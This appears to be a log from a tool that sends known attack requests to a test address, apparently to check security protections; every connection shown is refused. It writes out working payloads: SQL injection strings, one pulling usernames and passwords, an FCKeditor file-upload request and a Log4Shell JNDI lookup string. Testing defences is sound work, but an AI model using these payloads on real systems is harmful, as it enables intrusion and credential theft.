2025-12-02 17:04:45 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.5/cgi-bin/index.php?go=detail&id=-99999/**/UNION/**/SELECT/**/0,1,concat(1731363118,0x3a,424340739),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20: HTTPConnectionPool(host='203.0.113.5', port=80): Max retries exceeded with url: /cgi-bin/index.php?go=detail&id=-99999/**/UNION/**/SELECT/**/0,1,concat(1731363118,0x3a,424340739),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001DC54EE3F00>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
2025-12-02 17:04:46 - INFO - get_protection_by_name:371 - Fetching protection by name: SQL Servers UNION Query-based SQL Injection
2025-12-02 17:04:46 - DEBUG - get_protection_by_name:384 - Protection fetched: ('SQL Servers UNION Query-based SQL Injection', 'CVE-2022-31061,CVE-2022-32007,CVE-2022-32025,CVE-2022-32026,CVE-2022-32028,CVE-2022-38627,CVE-2022-40049,CVE-2022-44137,CVE-2022-45030,CVE-2022-46124,CVE-2022-47860,CVE-2023-20110,CVE-2023-46748,CVE-2023-51951', 'GET', 'http://{{IP}}/cgi-bin/guestbook.php?lang=de&mode=new&quote=-1 UNION SELECT 0,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM simpgb_users WHERE 1', 'http', 'High', 'Critical', 'Medium', '')
2025-12-02 17:04:46 - INFO - get_protection_by_name:399 - Protection 'SQL Servers UNION Query-based SQL Injection' retrieved successfully.
2025-12-02 17:04:46 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.5/cgi-bin/guestbook.php?lang=de&mode=new&quote=-1 UNION SELECT 0,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM simpgb_users WHERE 1 with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 17:04:46 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.5/cgi-bin/forum.php3?id_article=1&id_forum=-1/**/UNION/**/SELECT 46434965--: HTTPConnectionPool(host='203.0.113.5', port=80): Max retries exceeded with url: /cgi-bin/forum.php3?id_article=1&id_forum=-1/**/UNION/**/SELECT%2046434965-- (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001DC54F8B570>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
2025-12-02 17:04:48 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.5/cgi-bin/guestbook.php?lang=de&mode=new&quote=-1 UNION SELECT 0,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM simpgb_users WHERE 1: HTTPConnectionPool(host='203.0.113.5', port=80): Max retries exceeded with url: /cgi-bin/guestbook.php?lang=de&mode=new&quote=-1%20UNION%20SELECT%200,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20FROM%20simpgb_users%20WHERE%201 (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001DC54F8A690>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
2025-12-02 17:04:54 - INFO - get_protection_by_name:371 - Fetching protection by name: Flexible Poll SQL Injection (CVE-2018-5988)
2025-12-02 17:04:54 - DEBUG - get_protection_by_name:384 - Protection fetched: ('Flexible Poll SQL Injection (CVE-2018-5988)', 'CVE-2018-5988', 'GET', "http://{{IP}}/cgi-bin/index.php?id='", 'http', 'Medium', 'Critical', 'Medium', '')
2025-12-02 17:04:54 - INFO - get_protection_by_name:399 - Protection 'Flexible Poll SQL Injection (CVE-2018-5988)' retrieved successfully.
2025-12-02 17:04:54 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.5/cgi-bin/index.php?id=' with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 17:04:56 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.5/cgi-bin/index.php?id=': HTTPConnectionPool(host='203.0.113.5', port=80): Max retries exceeded with url: /cgi-bin/index.php?id=' (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001DC54F89590>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
2025-12-02 17:04:56 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:04:56 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:04:56 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:06:38 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:06:38 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:06:38 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:08:25 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:08:25 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:08:25 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:08:32 - INFO - get_protection_by_name:371 - Fetching protection by name: Flexible Poll SQL Injection (CVE-2018-5988)
2025-12-02 17:08:32 - DEBUG - get_protection_by_name:384 - Protection fetched: ('Flexible Poll SQL Injection (CVE-2018-5988)', 'CVE-2018-5988', 'GET', "http://{{IP}}/cgi-bin/index.php?id='", 'http', 'Medium', 'Critical', 'Medium', '')
2025-12-02 17:08:32 - INFO - get_protection_by_name:399 - Protection 'Flexible Poll SQL Injection (CVE-2018-5988)' retrieved successfully.
2025-12-02 17:08:32 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.5/cgi-bin/index.php?id=' with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 17:08:34 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.5/cgi-bin/index.php?id=': HTTPConnectionPool(host='203.0.113.5', port=80): Max retries exceeded with url: /cgi-bin/index.php?id=' (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001DC54F886B0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
2025-12-02 17:08:34 - INFO - get_protection_by_name:371 - Fetching protection by name: IMP SQL Injection (CVE-2003-0025)
2025-12-02 17:08:34 - DEBUG - get_protection_by_name:384 - Protection fetched: ('IMP SQL Injection (CVE-2003-0025)', 'CVE-2003-0025', 'GET', "http://{{IP}}/cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x", 'http', 'Medium', 'High', 'Medium', '')
2025-12-02 17:08:34 - INFO - get_protection_by_name:399 - Protection 'IMP SQL Injection (CVE-2003-0025)' retrieved successfully.
2025-12-02 17:08:34 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.5/cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 17:08:36 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.5/cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x: HTTPConnectionPool(host='203.0.113.5', port=80): Max retries exceeded with url: /cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001DC54F896A0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
2025-12-02 17:10:00 - INFO - get_protection_by_name:371 - Fetching protection by name: Flexible Poll SQL Injection (CVE-2018-5988)
2025-12-02 17:10:00 - DEBUG - get_protection_by_name:384 - Protection fetched: ('Flexible Poll SQL Injection (CVE-2018-5988)', 'CVE-2018-5988', 'GET', "http://{{IP}}/cgi-bin/index.php?id='", 'http', 'Medium', 'Critical', 'Medium', '')
2025-12-02 17:10:00 - INFO - get_protection_by_name:399 - Protection 'Flexible Poll SQL Injection (CVE-2018-5988)' retrieved successfully.
2025-12-02 17:10:00 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.5/cgi-bin/index.php?id=' with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 17:10:02 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.5/cgi-bin/index.php?id=': HTTPConnectionPool(host='203.0.113.5', port=80): Max retries exceeded with url: /cgi-bin/index.php?id=' (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001DC54F8A140>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
2025-12-02 17:10:02 - INFO - get_protection_by_name:371 - Fetching protection by name: IMP SQL Injection (CVE-2003-0025)
2025-12-02 17:10:02 - DEBUG - get_protection_by_name:384 - Protection fetched: ('IMP SQL Injection (CVE-2003-0025)', 'CVE-2003-0025', 'GET', "http://{{IP}}/cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x", 'http', 'Medium', 'High', 'Medium', '')
2025-12-02 17:10:02 - INFO - get_protection_by_name:399 - Protection 'IMP SQL Injection (CVE-2003-0025)' retrieved successfully.
2025-12-02 17:10:02 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.5/cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 17:10:04 - INFO - get_protection_by_name:371 - Fetching protection by name: Flexible Poll SQL Injection (CVE-2018-5988)
2025-12-02 17:10:04 - DEBUG - get_protection_by_name:384 - Protection fetched: ('Flexible Poll SQL Injection (CVE-2018-5988)', 'CVE-2018-5988', 'GET', "http://{{IP}}/cgi-bin/index.php?id='", 'http', 'Medium', 'Critical', 'Medium', '')
2025-12-02 17:10:04 - INFO - get_protection_by_name:399 - Protection 'Flexible Poll SQL Injection (CVE-2018-5988)' retrieved successfully.
2025-12-02 17:10:04 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.5/cgi-bin/index.php?id=' with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 17:10:04 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.5/cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x: HTTPConnectionPool(host='203.0.113.5', port=80): Max retries exceeded with url: /cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001DC54F8AE00>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
2025-12-02 17:10:05 - INFO - get_protection_by_name:371 - Fetching protection by name: IMP SQL Injection (CVE-2003-0025)
2025-12-02 17:10:05 - DEBUG - get_protection_by_name:384 - Protection fetched: ('IMP SQL Injection (CVE-2003-0025)', 'CVE-2003-0025', 'GET', "http://{{IP}}/cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x", 'http', 'Medium', 'High', 'Medium', '')
2025-12-02 17:10:05 - INFO - get_protection_by_name:399 - Protection 'IMP SQL Injection (CVE-2003-0025)' retrieved successfully.
2025-12-02 17:10:05 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.5/cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 17:10:06 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.5/cgi-bin/index.php?id=': HTTPConnectionPool(host='203.0.113.5', port=80): Max retries exceeded with url: /cgi-bin/index.php?id=' (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001DC54F89E10>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
2025-12-02 17:10:06 - INFO - get_protection_by_name:371 - Fetching protection by name: SQL Injection Scanning Attempt
2025-12-02 17:10:06 - DEBUG - get_protection_by_name:384 - Protection fetched: ('SQL Injection Scanning Attempt', 'CVE-2020-13118,CVE-2020-5510,CVE-2021-36748,CVE-2021-43140,CVE-2022-24219,CVE-2022-24220,CVE-2022-24221,CVE-2022-24222,CVE-2022-27412,CVE-2022-34265,CVE-2022-35121,CVE-2022-36669,CVE-2022-47862,CVE-2023-24780', 'GET', "http://{{IP}}/interscan/cgi-bin/FtpSave.dll?I'm Here", 'http', 'High', 'Critical', 'Medium', '')
2025-12-02 17:10:06 - INFO - get_protection_by_name:399 - Protection 'SQL Injection Scanning Attempt' retrieved successfully.
2025-12-02 17:10:06 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.5/interscan/cgi-bin/FtpSave.dll?I'm Here with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 17:10:07 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.5/cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x: HTTPConnectionPool(host='203.0.113.5', port=80): Max retries exceeded with url: /cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001DC54F8A470>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
2025-12-02 17:10:07 - INFO - get_protection_by_name:371 - Fetching protection by name: SQL Servers SQL Injection Evasion Techniques
2025-12-02 17:10:07 - DEBUG - get_protection_by_name:384 - Protection fetched: ('SQL Servers SQL Injection Evasion Techniques', 'CVE-2006-6177,CVE-2006-6577,CVE-2007-2492,CVE-2007-3526,CVE-2007-6656,CVE-2008-2855,CVE-2008-2856,CVE-2008-4463,CVE-2009-2341,CVE-2014-8682,CVE-2021-27581,CVE-2022-0169,CVE-2022-25225', 'GET', 'http://{{IP}}/cgi-bin/index.php?go=detail&id=-99999/**/UNION/**/SELECT/**/0,1,concat(1731363118,0x3a,424340739),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20', 'http', 'High', 'Critical', 'Medium', '')
2025-12-02 17:10:07 - INFO - get_protection_by_name:399 - Protection 'SQL Servers SQL Injection Evasion Techniques' retrieved successfully.
2025-12-02 17:10:07 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.5/cgi-bin/index.php?go=detail&id=-99999/**/UNION/**/SELECT/**/0,1,concat(1731363118,0x3a,424340739),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 17:10:08 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.5/interscan/cgi-bin/FtpSave.dll?I'm Here: HTTPConnectionPool(host='203.0.113.5', port=80): Max retries exceeded with url: /interscan/cgi-bin/FtpSave.dll?I'm%20Here (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001DC54FE46B0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
2025-12-02 17:10:09 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.5/cgi-bin/index.php?go=detail&id=-99999/**/UNION/**/SELECT/**/0,1,concat(1731363118,0x3a,424340739),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20: HTTPConnectionPool(host='203.0.113.5', port=80): Max retries exceeded with url: /cgi-bin/index.php?go=detail&id=-99999/**/UNION/**/SELECT/**/0,1,concat(1731363118,0x3a,424340739),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001DC54F8B350>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
2025-12-02 17:10:39 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:10:39 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:10:39 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:11:22 - INFO - get_protection_by_name:371 - Fetching protection by name: Flexible Poll SQL Injection (CVE-2018-5988)
2025-12-02 17:11:22 - DEBUG - get_protection_by_name:384 - Protection fetched: ('Flexible Poll SQL Injection (CVE-2018-5988)', 'CVE-2018-5988', 'GET', "http://{{IP}}/cgi-bin/index.php?id='", 'http', 'Medium', 'Critical', 'Medium', '')
2025-12-02 17:11:22 - INFO - get_protection_by_name:399 - Protection 'Flexible Poll SQL Injection (CVE-2018-5988)' retrieved successfully.
2025-12-02 17:11:22 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.5/cgi-bin/index.php?id=' with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 17:11:24 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.5/cgi-bin/index.php?id=': HTTPConnectionPool(host='203.0.113.5', port=80): Max retries exceeded with url: /cgi-bin/index.php?id=' (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001DC54F8A360>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
2025-12-02 17:11:25 - INFO - get_protection_by_name:371 - Fetching protection by name: IMP SQL Injection (CVE-2003-0025)
2025-12-02 17:11:25 - DEBUG - get_protection_by_name:384 - Protection fetched: ('IMP SQL Injection (CVE-2003-0025)', 'CVE-2003-0025', 'GET', "http://{{IP}}/cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x", 'http', 'Medium', 'High', 'Medium', '')
2025-12-02 17:11:25 - INFO - get_protection_by_name:399 - Protection 'IMP SQL Injection (CVE-2003-0025)' retrieved successfully.
2025-12-02 17:11:25 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.5/cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 17:11:27 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.5/cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x: HTTPConnectionPool(host='203.0.113.5', port=80): Max retries exceeded with url: /cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001DC54F88E20>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
2025-12-02 17:12:20 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:12:20 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:12:20 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:12:22 - INFO - get_protection_by_name:371 - Fetching protection by name: Flexible Poll SQL Injection (CVE-2018-5988)
2025-12-02 17:12:22 - DEBUG - get_protection_by_name:384 - Protection fetched: ('Flexible Poll SQL Injection (CVE-2018-5988)', 'CVE-2018-5988', 'GET', "http://{{IP}}/cgi-bin/index.php?id='", 'http', 'Medium', 'Critical', 'Medium', '')
2025-12-02 17:12:22 - INFO - get_protection_by_name:399 - Protection 'Flexible Poll SQL Injection (CVE-2018-5988)' retrieved successfully.
2025-12-02 17:12:22 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.5/cgi-bin/index.php?id=' with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 17:12:24 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.5/cgi-bin/index.php?id=': HTTPConnectionPool(host='203.0.113.5', port=80): Max retries exceeded with url: /cgi-bin/index.php?id=' (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001DC54F88C00>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
2025-12-02 17:12:25 - INFO - get_protection_by_name:371 - Fetching protection by name: IMP SQL Injection (CVE-2003-0025)
2025-12-02 17:12:25 - DEBUG - get_protection_by_name:384 - Protection fetched: ('IMP SQL Injection (CVE-2003-0025)', 'CVE-2003-0025', 'GET', "http://{{IP}}/cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x", 'http', 'Medium', 'High', 'Medium', '')
2025-12-02 17:12:25 - INFO - get_protection_by_name:399 - Protection 'IMP SQL Injection (CVE-2003-0025)' retrieved successfully.
2025-12-02 17:12:25 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.5/cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 17:12:27 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.5/cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x: HTTPConnectionPool(host='203.0.113.5', port=80): Max retries exceeded with url: /cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001DC54EE3BD0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
2025-12-02 17:12:27 - INFO - get_protection_by_name:371 - Fetching protection by name: SQL Injection Scanning Attempt
2025-12-02 17:12:27 - DEBUG - get_protection_by_name:384 - Protection fetched: ('SQL Injection Scanning Attempt', 'CVE-2020-13118,CVE-2020-5510,CVE-2021-36748,CVE-2021-43140,CVE-2022-24219,CVE-2022-24220,CVE-2022-24221,CVE-2022-24222,CVE-2022-27412,CVE-2022-34265,CVE-2022-35121,CVE-2022-36669,CVE-2022-47862,CVE-2023-24780', 'GET', "http://{{IP}}/interscan/cgi-bin/FtpSave.dll?I'm Here", 'http', 'High', 'Critical', 'Medium', '')
2025-12-02 17:12:27 - INFO - get_protection_by_name:399 - Protection 'SQL Injection Scanning Attempt' retrieved successfully.
2025-12-02 17:12:27 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.5/interscan/cgi-bin/FtpSave.dll?I'm Here with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 17:12:29 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.5/interscan/cgi-bin/FtpSave.dll?I'm Here: HTTPConnectionPool(host='203.0.113.5', port=80): Max retries exceeded with url: /interscan/cgi-bin/FtpSave.dll?I'm%20Here (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001DC54FE4C00>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
2025-12-02 17:12:30 - INFO - get_protection_by_name:371 - Fetching protection by name: SQL Servers SQL Injection Evasion Techniques
2025-12-02 17:12:30 - DEBUG - get_protection_by_name:384 - Protection fetched: ('SQL Servers SQL Injection Evasion Techniques', 'CVE-2006-6177,CVE-2006-6577,CVE-2007-2492,CVE-2007-3526,CVE-2007-6656,CVE-2008-2855,CVE-2008-2856,CVE-2008-4463,CVE-2009-2341,CVE-2014-8682,CVE-2021-27581,CVE-2022-0169,CVE-2022-25225', 'GET', 'http://{{IP}}/cgi-bin/index.php?go=detail&id=-99999/**/UNION/**/SELECT/**/0,1,concat(1731363118,0x3a,424340739),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20', 'http', 'High', 'Critical', 'Medium', '')
2025-12-02 17:12:30 - INFO - get_protection_by_name:399 - Protection 'SQL Servers SQL Injection Evasion Techniques' retrieved successfully.
2025-12-02 17:12:30 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.5/cgi-bin/index.php?go=detail&id=-99999/**/UNION/**/SELECT/**/0,1,concat(1731363118,0x3a,424340739),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 17:12:32 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.5/cgi-bin/index.php?go=detail&id=-99999/**/UNION/**/SELECT/**/0,1,concat(1731363118,0x3a,424340739),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20: HTTPConnectionPool(host='203.0.113.5', port=80): Max retries exceeded with url: /cgi-bin/index.php?go=detail&id=-99999/**/UNION/**/SELECT/**/0,1,concat(1731363118,0x3a,424340739),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001DC54FE5480>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
2025-12-02 17:12:33 - INFO - get_protection_by_name:371 - Fetching protection by name: SQL Servers Unauthorized Commands SQL Injection
2025-12-02 17:12:33 - DEBUG - get_protection_by_name:384 - Protection fetched: ('SQL Servers Unauthorized Commands SQL Injection', 'CVE-2014-3704,CVE-2019-13978,CVE-2019-9053,CVE-2021-41843,CVE-2022-0592,CVE-2022-0781,CVE-2022-0836,CVE-2022-1905,CVE-2022-26887,CVE-2022-28346,CVE-2022-30809,CVE-2022-30810,CVE-2022-30815,CVE-2024-33559', 'GET', 'http://{{IP}}/cgi-bin/forum.php3?id_article=1&id_forum=-1/**/UNION/**/SELECT 46434965--', 'http', 'High', 'High', 'Medium', '')
2025-12-02 17:12:33 - INFO - get_protection_by_name:399 - Protection 'SQL Servers Unauthorized Commands SQL Injection' retrieved successfully.
2025-12-02 17:12:33 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.5/cgi-bin/forum.php3?id_article=1&id_forum=-1/**/UNION/**/SELECT 46434965-- with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 17:12:35 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.5/cgi-bin/forum.php3?id_article=1&id_forum=-1/**/UNION/**/SELECT 46434965--: HTTPConnectionPool(host='203.0.113.5', port=80): Max retries exceeded with url: /cgi-bin/forum.php3?id_article=1&id_forum=-1/**/UNION/**/SELECT%2046434965-- (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001DC54EE3DF0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
2025-12-02 17:12:36 - INFO - get_protection_by_name:371 - Fetching protection by name: SQL Servers UNION Query-based SQL Injection
2025-12-02 17:12:36 - DEBUG - get_protection_by_name:384 - Protection fetched: ('SQL Servers UNION Query-based SQL Injection', 'CVE-2022-31061,CVE-2022-32007,CVE-2022-32025,CVE-2022-32026,CVE-2022-32028,CVE-2022-38627,CVE-2022-40049,CVE-2022-44137,CVE-2022-45030,CVE-2022-46124,CVE-2022-47860,CVE-2023-20110,CVE-2023-46748,CVE-2023-51951', 'GET', 'http://{{IP}}/cgi-bin/guestbook.php?lang=de&mode=new&quote=-1 UNION SELECT 0,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM simpgb_users WHERE 1', 'http', 'High', 'Critical', 'Medium', '')
2025-12-02 17:12:36 - INFO - get_protection_by_name:399 - Protection 'SQL Servers UNION Query-based SQL Injection' retrieved successfully.
2025-12-02 17:12:36 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.5/cgi-bin/guestbook.php?lang=de&mode=new&quote=-1 UNION SELECT 0,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM simpgb_users WHERE 1 with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 17:12:38 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.5/cgi-bin/guestbook.php?lang=de&mode=new&quote=-1 UNION SELECT 0,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM simpgb_users WHERE 1: HTTPConnectionPool(host='203.0.113.5', port=80): Max retries exceeded with url: /cgi-bin/guestbook.php?lang=de&mode=new&quote=-1%20UNION%20SELECT%200,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20FROM%20simpgb_users%20WHERE%201 (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001DC54F88C00>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
2025-12-02 17:12:39 - INFO - get_protection_by_name:371 - Fetching protection by name: Adobe ColdFusion FCKeditor Input Validation Flaw Arbitrary File Upload
2025-12-02 17:12:39 - DEBUG - get_protection_by_name:384 - Protection fetched: ('Adobe ColdFusion FCKeditor Input Validation Flaw Arbitrary File Upload', 'CVE-2008-6178,CVE-2009-2265', 'GET', 'http://{{IP}}/cgi-bin/editor/filemanager/connectors/php/upload.php?Command=FileUpload&Type=File&CurrentFolder=/fckeditor_currentfolder_file_upload-1731363398.php.', 'http', 'High', 'High', 'Medium', '')
2025-12-02 17:12:39 - INFO - get_protection_by_name:399 - Protection 'Adobe ColdFusion FCKeditor Input Validation Flaw Arbitrary File Upload' retrieved successfully.
2025-12-02 17:12:39 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.5/cgi-bin/editor/filemanager/connectors/php/upload.php?Command=FileUpload&Type=File&CurrentFolder=/fckeditor_currentfolder_file_upload-1731363398.php. with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 17:12:41 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.5/cgi-bin/editor/filemanager/connectors/php/upload.php?Command=FileUpload&Type=File&CurrentFolder=/fckeditor_currentfolder_file_upload-1731363398.php.: HTTPConnectionPool(host='203.0.113.5', port=80): Max retries exceeded with url: /cgi-bin/editor/filemanager/connectors/php/upload.php?Command=FileUpload&Type=File&CurrentFolder=/fckeditor_currentfolder_file_upload-1731363398.php. (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001DC54F89260>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
2025-12-02 17:12:42 - INFO - get_protection_by_name:371 - Fetching protection by name: Apache Log4j Remote Code Execution (CVE-2021-44228)
2025-12-02 17:12:42 - DEBUG - get_protection_by_name:384 - Protection fetched: ('Apache Log4j Remote Code Execution (CVE-2021-44228)', 'CVE-2021-44228,CVE-2021-45046', 'GET', 'http://{{IP}}/', 'http', 'Medium', 'Critical', 'Medium', '${jndi:ldap://127.0.0.1#log4shell-generic-c6hAKQa3xrV889pe4Lrm.w.nessus.org/nessus}')
